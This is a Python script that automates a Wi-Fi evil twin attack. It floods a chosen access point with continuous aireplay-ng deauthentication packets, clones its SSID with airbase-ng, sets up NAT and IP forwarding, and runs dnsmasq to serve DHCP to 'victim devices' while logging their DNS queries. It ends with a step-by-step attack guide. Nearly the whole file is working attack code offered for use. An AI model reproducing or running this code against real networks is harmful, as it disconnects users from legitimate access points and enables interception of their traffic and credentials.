import os
import time

import Network
import main
from Network import clear, ansi_escape_red, ansi_escape_green

import threading
import subprocess

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']

def arp_spoof(interface):
    return

def switch_interface_channel(interface, target_channel):
    command = f'iwconfig {interface} channel {target_channel}'
    switch_channel = subprocess.Popen(command, shell=True)
    switch_channel.wait()
    print(f'{ansi_escape_green(interface)} set to channel {target_channel}')
    return


def aireplay_on_target_bssid(interface, channel, target_ap=None, target_bssid=None):
    for terminal in terminals:
        if target_bssid and not target_ap:
            command = f'aireplay-ng --deauth 0 -a {target_bssid} {interface}'
            message_to_user = f'running aireplay on {ansi_escape_green(target_bssid)}'
        else:
            command = f'aireplay-ng --deauth 0 -e {target_ap} {interface}'
            message_to_user = f'running aireplay on {ansi_escape_green(target_ap)}'
        switch_interface_channel(interface, channel)
        command_with_terminal = [f'{terminal} -e {command}']
        aireplay = subprocess.Popen(command_with_terminal, shell=True)
        print(message_to_user)
        # aireplay.wait() wait holds the thread do not use it
        return


def airbase_host_evil_twin(interface, channel, target_ap=None, target_bssid=None):
    for terminal in terminals:
        if target_bssid and not target_ap:
            print('not implemented ')
            message_to_user = f'running airbase-ng to host {ansi_escape_green(target_bssid)}'
            return
        else:
            command = f'airbase-ng -e {target_ap} -c {channel} {interface}'
            message_to_user = f'running airbase-ng to host {ansi_escape_green(target_bssid)}'
        command_with_terminal = [f'{terminal} -e {command}']
        airbase = subprocess.Popen(command_with_terminal, shell=True)
        print(message_to_user)
        print(f"New Thread Started from {ansi_escape_green('airbase_host_evil_twin()')} on {ansi_escape_green('configure_at0()')}")
        time.sleep(1) # wait a second for airbase to create at0
        thread_configure_at0 = threading.Thread(
            target=configure_at0(interface))
        thread_configure_at0.start()
        thread_configure_at0.join()
        print(f"Thread on {ansi_escape_green('configure_at0()')} has closed")

        # airbase.wait()
        return

def create_dnsmasq_conf():
    """

    :return: dnsmasq_conf_location : location of dnsmasq.conf file to be used in dnsmasq()
    """
    dnsmasq_conf_location = '/tmp/dnsmasq.conf'
    conf_file = ["interface=at0",
                 "dhcp-range=10.0.0.20,10.0.0.250,255.255.255.0,12h",
                 "dhcp-option=3,10.0.0.1",
                 "dhcp-option=6,10.0.0.1",
                 "server=8.8.8.8",
                 "server=8.8.4.4",
                 "server=64.6.64.6",
                 "server=64.6.65.6",
                 "log-queries",
                 "log-dhcp",
                 "listen-address=127.0.0.1"
    ]
    with open(dnsmasq_conf_location,'w') as dnsmasq_conf:
        for line in conf_file:
            dnsmasq_conf.write(line+ "\n")
    print('dnsmasq.conf created at /tmp/dnsmasq.conf')
    return dnsmasq_conf_location

def dnsmasq():
    dnsmasq_conf_location = create_dnsmasq_conf()
    print(f'Running dnsmasq with the config file on {ansi_escape_green(dnsmasq_conf_location)}')
    for terminal in terminals:
        dnsmasq_command = f'dnsmasq -C {dnsmasq_conf_location} -d'
        run_dnsmasq = subprocess.Popen(f'{terminal} -e {dnsmasq_command}'
                                       ,shell=True)
        run_dnsmasq.wait()
        print(f'{ansi_escape_green("dnsmasq")} has closed')
        return



def configure_at0(interface):
    """
    allows at0 to host network to victim devices.
    :return:
    """
    interface = 'wlan0'
    # main.selected_interface_managed_mode()

    at0_up = subprocess.Popen(f'ifconfig at0 up'
                              ,shell=True)
    at0_up.wait()
    print('at0_up')

    # at0_mtu = subprocess.Popen(f'ifconfig at0 mtu 1500'
    #                            ,shell=True)
    # at0_mtu.wait()
    # print('at0_mtu')
    #
    at0_netmask = subprocess.Popen(f'ifconfig at0 10.0.0.1 netmask 255.255.255.0'
                                   ,shell=True)
    at0_netmask.wait()

    print('at0_netmask')


    at0_route = subprocess.Popen(f'route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1'
                                 ,shell=True)
    at0_route.wait()
    print('at0_route')

    # setup port forwarding
    at0_port_forward = subprocess.Popen(f'iptables -P FORWARD ACCEPT'
                                        ,shell=True)
    at0_port_forward.wait()
    print('at0_port_forward')

    #
    at0_route_to_interface = subprocess.Popen(f'iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE'
                                              ,shell=True)
    at0_route_to_interface.wait()
    print('at0_route_to_interface')

    give_permission = subprocess.Popen(f'echo 1 > /proc/sys/net/ipv4/ip_forward'
                                       ,shell=True)
    print('give_permission')

    # give_permission = subprocess.Popen('echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward',shell=True,user=)
    # print('give_permission')


def evil_twin(interface, target_ap):
    bssid, channel = Network.get_BSSID_and_Station_from_AP(interface, target_ap)
    thread_aireplay = threading.Thread(
        target=aireplay_on_target_bssid(interface, channel, target_ap=target_ap, target_bssid=bssid))
    thread_airbase = threading.Thread(
        target=airbase_host_evil_twin(interface, channel, target_ap=target_ap, target_bssid=bssid))
    thread_dnsmasq = threading.Thread(
        target=dnsmasq()
    )
    print(f'Starting Thread for {ansi_escape_green("aireplay-ng")}')
    thread_aireplay.start()
    print(f'Starting Thread for {ansi_escape_green("airbase-ng")}')
    thread_airbase.start()
    print(f'Starting Thread for {ansi_escape_green("dnsmasq")}')
    thread_dnsmasq.start()

"""
How to perform a evil twin attack

pre-attack:
    1. install/update aircrack-ng and dnsmasq
    2. create a configureation file to be used in dnsmasq
    2.1 create a file with this name 'dnsmasq.conf' then type
        interface=at0
        dhcp-range=10.0.0.20,10.0.0.250,255.255.255.0,12h
        dhcp-option=3,10.0.0.1
        dhcp-option=6,10.0.0.1
        server=8.8.8.8
        server=8.8.4.4
        server=64.6.64.6
        server=64.6.65.6        
        log-queries
        log-dhcp
        listen-address=127.0.0.1
        
1. set interface to monitor mode
2. scan targets with airodump-ng
3. use airbase-ng to host a wifi with same ssid as target
    - airbase will set the evil twin on interface at0
4. configure at0
5. run dnsqmasq
4. use aricrack-ng to deauth the original target wifi 

"""